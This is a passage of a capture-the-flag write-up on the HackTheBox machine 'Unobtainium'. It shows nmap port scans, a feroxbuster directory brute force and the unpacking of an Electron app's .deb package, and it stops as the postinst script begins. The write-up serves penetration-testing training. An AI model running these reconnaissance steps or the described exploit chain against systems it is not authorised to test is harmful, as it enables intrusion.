
<!DOCTYPE html>
<html lang="en"><head>
  <meta name="name" content="HTB: Unobtainium">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HTB: Unobtainium | 0xdf hacks stuff</title>
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="HTB: Unobtainium" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Unobtainium was the first box on HackTheBox to play with Kubernetes, a technology for deploying and managing containers. It also has a Electron application to reverse, which allows for multiple exploits against the server, first local file include, then prototype pollution, and finally command injection. With a shell, I’ll find a way to gain admin access over Kubernetes and get root with a malicious container." />
<meta property="og:description" content="Unobtainium was the first box on HackTheBox to play with Kubernetes, a technology for deploying and managing containers. It also has a Electron application to reverse, which allows for multiple exploits against the server, first local file include, then prototype pollution, and finally command injection. With a shell, I’ll find a way to gain admin access over Kubernetes and get root with a malicious container." />
<link rel="canonical" href="https://0xdf.gitlab.io/2021/09/04/htb-unobtainium.html" />
<meta property="og:url" content="https://0xdf.gitlab.io/2021/09/04/htb-unobtainium.html" />
<meta property="og:site_name" content="0xdf hacks stuff" />
<meta property="og:image" content="https://0xdfimages.gitlab.io/img/unobtainium-cover.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-09-04T13:45:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:image" content="https://0xdfimages.gitlab.io/img/unobtainium-cover.png" />
<meta property="twitter:title" content="HTB: Unobtainium" />
<meta name="twitter:site" content="@0xdf_" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-09-04T13:45:00+00:00","datePublished":"2021-09-04T13:45:00+00:00","description":"Unobtainium was the first box on HackTheBox to play with Kubernetes, a technology for deploying and managing containers. It also has a Electron application to reverse, which allows for multiple exploits against the server, first local file include, then prototype pollution, and finally command injection. With a shell, I’ll find a way to gain admin access over Kubernetes and get root with a malicious container.","headline":"HTB: Unobtainium","image":"https://0xdfimages.gitlab.io/img/unobtainium-cover.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xdf.gitlab.io/2021/09/04/htb-unobtainium.html"},"url":"https://0xdf.gitlab.io/2021/09/04/htb-unobtainium.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/bootstrap-toc.min.css">
  <link rel="stylesheet" href="/assets/css/main.css">
  <link rel="stylesheet" href="/assets/css/custom.css"> 
  <link rel="stylesheet" href="/assets/css/buymeacoffee.css">
  
  <link rel="stylesheet" href="/assets/css/syntax.css">
  
<link type="application/atom+xml" rel="alternate" href="https://0xdf.gitlab.io/feed.xml" title="0xdf hacks stuff" /><!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-P056MVQVGM"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-P056MVQVGM');
</script>
<!--<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-120216868-1', 'auto');
ga('send', 'pageview');
</script>-->
  
<link rel="icon" type="image/png" href="/assets/icons/favicon-32x32.png" sizes="32x32" />
  <link rel="icon" type="image/png" href="/assets/icons/favicon-16x16.png" sizes="16x16" />
</head>

  <body data-spy="scroll" data-toggle="toc" data-offset="150">
  
<header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">0xdf hacks stuff</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger">
            <a class="page-link-site" href="/">Home</a>
<a class="page-link-site" href="/about">About Me</a><a class="page-link-site" href="/tags">Tags</a><a class="page-link-site" href="/cheatsheets/">Cheatsheets</a><a class="page-link-site bmc" href="https://youtube.com/@0xdf"><img src="/icons/youtube.png" class="svg-icon" alt="" />YouTube</a>
          <a class="page-link-site bmc" href="https://gitlab.com/0xdf/ctfscripts"><img src="/icons/gitlab.png" class="svg-icon" alt="" />Gitlab</a><a class="page-link-site bmc" href="/feed.xml"><img src="/icons/rss.png" class="svg-icon" alt="" /><span>feed</span></a><a class="page-link-site bmc" target="_blank"
href="https://www.buymeacoffee.com/0xdf"><img src="https://cdn.buymeacoffee.com/buttons/bmc-new-btn-logo.svg" alt="Buy me a coffee" style="-webkit-filter: drop-shadow(0px 0px 2px white); filter: drop-shadow(0px 0px 2px white);"></a>
        </div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">HTB: Unobtainium</h1>
    <p class="post-meta">

<span class="tag-list"><a href="/tags#hackthebox" class="post-tag">hackthebox</a> <a href="/tags#ctf" class="post-tag">ctf</a> <a href="/tags#htb-unobtainium" class="post-tag">htb-unobtainium</a> <a href="/tags#nmap" class="post-tag">nmap</a> <a href="/tags#kubernetes" class="post-tag">kubernetes</a> <a href="/tags#deb" class="post-tag">deb</a> <a href="/tags#package" class="post-tag">package</a> <a href="/tags#electron" class="post-tag">electron</a> <a href="/tags#nodejs" class="post-tag">nodejs</a> <a href="/tags#lfi" class="post-tag">lfi</a> <a href="/tags#prototype-pollution" class="post-tag">prototype-pollution</a> <a href="/tags#command-injection" class="post-tag">command-injection</a> <a href="/tags#injection" class="post-tag">injection</a> <a href="/tags#asar" class="post-tag">asar</a> <a href="/tags#sans-holiday-hack" class="post-tag">sans-holiday-hack</a> <a href="/tags#htb-onetwoseven" class="post-tag">htb-onetwoseven</a> <a href="/tags#source-code" class="post-tag">source-code</a> <a href="/tags#kubectl" class="post-tag">kubectl</a> <a href="/tags#oswe-like" class="post-tag">oswe-like</a> </span><br/><br/>


<time class="dt-published" datetime="2021-09-04T13:45:00+00:00" itemprop="datePublished">Sep 4, 2021
      </time></p>

  </header>

  
  <div class="post-content e-content" itemprop="articleBody">
    <div class="row">
      <div class="col-sm-3">
        <div class="sticky-top">
            <p><a href="#" style="color: #e6e6e6; text-decoration: none;">HTB: Unobtainium</a></p>
	    <!--https://afeld.github.io/bootstrap-toc/-->  
          <nav id="toc" data-toggle="toc"></nav>
        </div>
      </div>
      <div class="col-sm-9" id="postBody">
        
<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/unobtainium-cover.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/unobtainium-cover.png" alt="Unobtainium" style="float: right; margin-right:50px; margin-left:50px; height:120px;" class="include_image " />
</picture>

<p>Unobtainium was the first box on HackTheBox to play with Kubernetes, a technology for deploying and managing containers. It also has a Electron application to reverse, which allows for multiple exploits against the server, first local file include, then prototype pollution, and finally command injection. With a shell, I’ll find a way to gain admin access over Kubernetes and get root with a malicious container.</p>
<h2 id="box-info">Box Info</h2>

<!-- https://app.hackthebox.com/machines/338 -->

<table>
  <thead>
    <tr>
      <th>Name</th>
      <th style="text-align: right"><a href="https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Funobtainium" target="_blank" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9">Unobtainium</a> <a href="https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Funobtainium" target="_blank"><picture style="float: right; padding-left: 20px;"><source type="image/webp" srcset="/icons/box-unobtainium.webp" /> <img src="/icons/box-unobtainium.png" alt="Unobtainium" class="img-av" /></picture></a><br /><a href="https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Funobtainium" target="_blank" style="font-size: small; color: white;">Play on HackTheBox</a></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Release Date</td>
      <td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1433068810517598208">10 Apr 2021</a></td>
    </tr>
    <tr>
      <td>Retire Date</td>
      <td style="text-align: right">04 Sep 2021</td>
    </tr>
    <tr>
      <td>OS</td>
      <td style="text-align: right">Linux <picture><source type="image/webp" srcset="/icons/Linux.webp" /><img src="/icons/Linux.png" alt="Linux" class="img-os" /></picture></td>
    </tr>
    <tr>
      <td>Base Points</td>
      <td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
    </tr>
    <tr>
      <td>Rated Difficulty</td>
      <td style="text-align: right"><picture><source type="image/webp" srcset="/img/unobtainium-diff.webp" /><img src="/img/unobtainium-diff.png" alt="Rated difficulty for Unobtainium" style="display: unset;" /></picture></td>
    </tr>
    <tr>
      <td>Radar Graph</td>
      <td style="text-align: right"><picture><source type="image/webp" srcset="/img/unobtainium-radar.webp" /><img src="/img/unobtainium-radar.png" alt="Radar chart for Unobtainium" style="display: unset;" /></picture></td>
    </tr>
    <tr>
      <td><picture><source type="image/webp" srcset="/icons/first-blood-user.webp" /><img src="/icons/first-blood-user.png" alt="First Blood User" style="display: unset" /></picture></td>
      <td style="text-align: right"><span class="blood-time">00:30:48</span><a href="https://app.hackthebox.com/users/114435" target="_blank" rel="noopener"><img alt="celesian" src="https://www.hackthebox.com/badge/image/114435" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> celesian</span></a><br /></td>
    </tr>
    <tr>
      <td><picture><source type="image/webp" srcset="/icons/first-blood-root.webp" /><img src="/icons/first-blood-root.png" alt="First Blood Root" style="display: unset" /></picture></td>
      <td style="text-align: right"><span class="blood-time">02:51:28</span><a href="https://app.hackthebox.com/users/77141" target="_blank" rel="noopener"><img alt="jkr" src="https://www.hackthebox.com/badge/image/77141" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> jkr</span></a><br /></td>
    </tr>
    <tr>
      <td>Creator</td>
      <td style="text-align: right"><a href="https://app.hackthebox.com/users/27390" target="_blank" rel="noopener"><img alt="felamos" src="https://www.hackthebox.com/badge/image/27390" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> felamos</span></a><br /></td>
    </tr>
  </tbody>
</table>

<h2 id="recon">Recon</h2>

<h3 id="nmap">nmap</h3>

<p><code class="language-plaintext highlighter-rouge">nmap</code> found eight open TCP ports, SSH (22) and HTTP (80), as well as six other HTTP/HTTPS looking servers:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.10.235
<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-08 10:14 EDT
Nmap scan report for unobtainium.htb (10.10.10.235)
Host is up (0.097s latency).
Not shown: 65527 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
2379/tcp  open  etcd-client
2380/tcp  open  etcd-server
8443/tcp  open  https-alt
10250/tcp open  unknown
10256/tcp open  unknown
31337/tcp open  Elite

Nmap done: 1 IP address (1 host up) scanned in 12.07 seconds
</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80,2379,2380,8443,10250,10256,31337 <span class="nt">-sCV</span> 10000 <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.10.235
<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-08 10:24 EDT
Nmap scan report for unobtainium.htb (10.10.10.235)
Host is up (0.093s latency).

PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA)
|   256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA)
|_  256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519)
80/tcp    open  http             Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Unobtainium
2379/tcp  open  ssl/etcd-client?
| ssl-cert: Subject: commonName=unobtainium
| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2021-01-17T07:10:30
|_Not valid after:  2022-01-17T07:10:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
| tls-nextprotoneg: 
|_  h2
2380/tcp  open  ssl/etcd-server?
| ssl-cert: Subject: commonName=unobtainium
| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2021-01-17T07:10:30
|_Not valid after:  2022-01-17T07:10:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
| tls-nextprotoneg: 
|_  h2
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Thu, 08 Apr 2021 14:24:42 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Thu, 08 Apr 2021 14:24:41 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Thu, 08 Apr 2021 14:24:41 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2021-04-06T19:57:58
|_Not valid after:  2022-04-07T19:57:58
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=unobtainium@1610865428
| Subject Alternative Name: DNS:unobtainium
| Not valid before: 2021-01-17T05:37:08
|_Not valid after:  2022-01-17T05:37:08
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
31337/tcp open  http             Node.js Express framework
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.91%T=SSL%I=7%D=4/8%Time=606F1228%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,1FF,"HTTP/1\.0\x20403\x20Forbidden\r\nCache-Control:\x20n
SF:o-cache,\x20private\r\nContent-Type:\x20application/json\r\nX-Content-T
SF:ype-Options:\x20nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x203082aa7f-
SF:e4b1-444a-a726-829587cd9e39\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20c4
SF:131e14-5fda-4a46-8349-09ccbed9efdd\r\nDate:\x20Thu,\x2008\x20Apr\x20202
SF:1\x2014:24:41\x20GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":\"Statu
SF:s\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"mess
SF:age\":\"forbidden:\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get
SF:\x20path\x20\\\"/\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\
SF:":403}\n")%r(HTTPOptions,203,"HTTP/1\.0\x20403\x20Forbidden\r\nCache-Co
SF:ntrol:\x20no-cache,\x20private\r\nContent-Type:\x20application/json\r\n
SF:X-Content-Type-Options:\x20nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x
SF:203082aa7f-e4b1-444a-a726-829587cd9e39\r\nX-Kubernetes-Pf-Prioritylevel
SF:-Uid:\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\r\nDate:\x20Thu,\x2008\x2
SF:0Apr\x202021\x2014:24:41\x20GMT\r\nContent-Length:\x20189\r\n\r\n{\"kin
SF:d\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failu
SF:re\",\"message\":\"forbidden:\x20User\x20\\\"system:anonymous\\\"\x20ca
SF:nnot\x20options\x20path\x20\\\"/\\\"\",\"reason\":\"Forbidden\",\"detai
SF:ls\":{},\"code\":403}\n")%r(FourOhFourRequest,21A,"HTTP/1\.0\x20403\x20
SF:Forbidden\r\nCache-Control:\x20no-cache,\x20private\r\nContent-Type:\x2
SF:0application/json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Kubernetes
SF:-Pf-Flowschema-Uid:\x203082aa7f-e4b1-444a-a726-829587cd9e39\r\nX-Kubern
SF:etes-Pf-Prioritylevel-Uid:\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\r\nD
SF:ate:\x20Thu,\x2008\x20Apr\x202021\x2014:24:42\x20GMT\r\nContent-Length:
SF:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":
SF:{},\"status\":\"Failure\",\"message\":\"forbidden:\x20User\x20\\\"syste
SF:m:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/nice\x20ports,/Trinity
SF:\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\
SF:n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (1 host up) scanned in 107.13 seconds
</span></code></pre></div></div>

<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> and <a href="https://packages.ubuntu.com/search?keywords=apache2">Apache</a> versions, the host is likely running Ubuntu Focal 20.04.</p>

<p>There are a handful of TLS certs in there showing DNS names of <code class="language-plaintext highlighter-rouge">unobtainium</code>. I’ll add both <code class="language-plaintext highlighter-rouge">unobtainium</code> and <code class="language-plaintext highlighter-rouge">unobtainium.htb</code> to my local <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>

<p>The certs for port 8443 are kubernetes related.</p>

<p>A bunch of these ports didn’t give much. <code class="language-plaintext highlighter-rouge">https://10.10.10.235:10250/</code> and <code class="language-plaintext highlighter-rouge">http://10.10.10.235:10256/</code> both returns a 404. <code class="language-plaintext highlighter-rouge">http://10.10.10.235:31337/</code> returns an empty JSON payload (<code class="language-plaintext highlighter-rouge">[]</code>).</p>

<p>These are all worth coming back to and fuzzing a bit, but I’ll check out the others first.</p>

<h3 id="https---tcp-8443">HTTPS - TCP 8443</h3>

<p>There’s an HTTPs API on 8443. Visiting it returns JSON that indicates I need auth:</p>

<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/image-20210408105935159.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210408105935159.png" alt="image-20210408105935159" class="include_image " />
</picture>

<p>Googling that <code class="language-plaintext highlighter-rouge">message</code> returns a bunch of posts about Kubernetes API server:</p>

<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/image-20210408113212708.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210408113212708.png" alt="image-20210408113212708" class="include_image " />
</picture>

<p>This is a Kubernetes API server.</p>

<h3 id="http---tcp-80">HTTP - TCP 80</h3>

<h4 id="site">Site</h4>

<p>The site is a chat application, and loads the same over IP or DNS name:</p>

<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/image-20210406145840659.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210406145840659.png" alt="image-20210406145840659" class="include_image " />
</picture>

<p>The three buttons are linked to download <code class="language-plaintext highlighter-rouge">unobtainium_debian.zip</code>, <code class="language-plaintext highlighter-rouge">unobtainium_redhat.zip</code>, and <code class="language-plaintext highlighter-rouge">unobtainium_snap.zip</code>. I’ll grab each of those.</p>

<h4 id="directory-brute-force">Directory Brute Force</h4>

<p>I’ll run <a href="https://github.com/epi052/feroxbuster">ferobuster</a> against the site, but it doesn’t find anything interesting:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.10.235
<span class="go">
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.235
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      313c http://10.10.10.235/images
</span><span class="feroxbuster-red">403</span><span class="go">        9l       28w      277c http://10.10.10.235/server-status
</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      313c http://10.10.10.235/assets
</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      316c http://10.10.10.235/assets/js
</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      317c http://10.10.10.235/assets/css
</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      324c http://10.10.10.235/assets/css/images
[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 2m    179994/179994  0s      </span><span class="feroxbuster-green">found</span><span class="go">:6       </span><span class="feroxbuster-red">errors</span><span class="go">:34630  
[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   334/s   http://10.10.10.235
[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   324/s   http://10.10.10.235/images
[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   293/s   http://10.10.10.235/assets
[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   295/s   http://10.10.10.235/assets/js
[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   310/s   http://10.10.10.235/assets/css
[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   315/s   http://10.10.10.235/assets/css/images
</span></code></pre></div></div>

<h3 id="package-re">Package RE</h3>

<h4 id="unpacking-deb">Unpacking Deb</h4>

<p>I’ll assume from the start that the three packages install the same underlying code (which might not be true, and if I get stuck down the road, I’ll want to come back and check that assumption). I’m most comfortable with Debian-based stuff, so I’ll start with the <code class="language-plaintext highlighter-rouge">deb</code> download.</p>

<p>Unzipping it gives a <code class="language-plaintext highlighter-rouge">.deb</code> package and a <code class="language-plaintext highlighter-rouge">.deb.md5sum</code> file. The second file looks like the output of the <code class="language-plaintext highlighter-rouge">md5sum</code> command:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">cat </span>unobtainium_1.0.0_amd64.deb.md5sum 
<span class="go">c9fe8a2bbc66290405803c3d4a37cf28  unobtainium_1.0.0_amd64.deb
</span></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">md5sum</code> has a <code class="language-plaintext highlighter-rouge">--check</code> option where you give it a file like this, and it verifies the files match. This one seems good:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">md5sum</span> <span class="nt">--check</span> unobtainium_1.0.0_amd64.deb.md5sum 
<span class="go">unobtainium_1.0.0_amd64.deb: OK
</span></code></pre></div></div>

<p>I could just install this application with <code class="language-plaintext highlighter-rouge">dpkg -i [.deb file]</code>, but give it’s an unknown package, I prefer to reverse it a bit. <code class="language-plaintext highlighter-rouge">ar</code> will <a href="https://linux.die.net/man/1/ar">pull files from a Debian package</a>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>ar x unobtainium_1.0.0_amd64.deb
</code></pre></div></div>

<p>This generates three new files, <code class="language-plaintext highlighter-rouge">debian-binary</code>, <code class="language-plaintext highlighter-rouge">control.tar.gz</code>, and <code class="language-plaintext highlighter-rouge">data.tar.xz</code>.</p>

<p><code class="language-plaintext highlighter-rouge">debian-binary</code> just contains the string “2.0”.</p>

<p><code class="language-plaintext highlighter-rouge">control.tar.gz</code> has four files that manage how the package is installed: <code class="language-plaintext highlighter-rouge">postinst</code>, <code class="language-plaintext highlighter-rouge">postrm</code>, <code class="language-plaintext highlighter-rouge">control</code>, and <code class="language-plaintext highlighter-rouge">md5sums</code>. <code class="language-plaintext highlighter-rouge">md5sums</code> has 80 lines of things to check after the install happened to make sure everything worked correctly.</p>

<p><code class="language-plaintext highlighter-rouge">control</code> is the metadata about the package:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Package: unobtainium
Version: 1.0.0
License: ISC
Vendor: felamos &lt;felamos@unobtainium.htb&gt;
Architecture: amd64
Maintainer: felamos &lt;felamos@unobtainium.htb&gt;
Installed-Size: 185617
Depends: libgtk-3-0, libnotify4, libnss3, libxss1, libxtst6, xdg-utils, libatspi2.0-0, libuuid1, libappindicator3-1, libsecret-1-0
Section: default
Priority: extra
Homepage: http://unobtainium.htb
Description: 
  client
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">postinst</code> and <code class="language-plaintext highlighter-rouge">postrm</code> are scripts that are run after install and uninstall respectively. In <a href="/2019/08/31/htb-onetwoseven.html#create-poisoned-package">OneTwoSeven</a> I created a malicious Deb package, and <code class="language-plaintext highlighter-rouge">postinst</code> was where I added the code I wanted to execute.</p>

<p><code class="language-plaintext highlighter-rouge">postinst</code> has a hint about Electron 5+:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="c"># Link to the binary</span>
